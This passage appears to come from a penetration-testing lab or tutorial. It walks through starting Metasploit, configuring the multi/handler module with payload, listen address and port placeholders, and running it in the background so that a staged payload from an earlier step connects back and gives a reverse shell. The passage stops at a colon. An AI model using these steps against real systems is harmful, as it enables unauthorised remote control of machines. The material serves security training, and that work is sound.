Start Metasploit:
```
msfconsole
```

Set to Multihandler:
```
use multi/handler
```

Check options:
```
options
```

Set options:
- `set PAYLOAD <payload>`
- `set LHOST <listen-address>`
- `set LPORT <listen-port>`

Run exploit and put it in background:

```
exploit -j
```

When the staged payload generated in the previous task is run, Metasploit receives the connection, sending the remainder of the payload and giving us a reverse shell: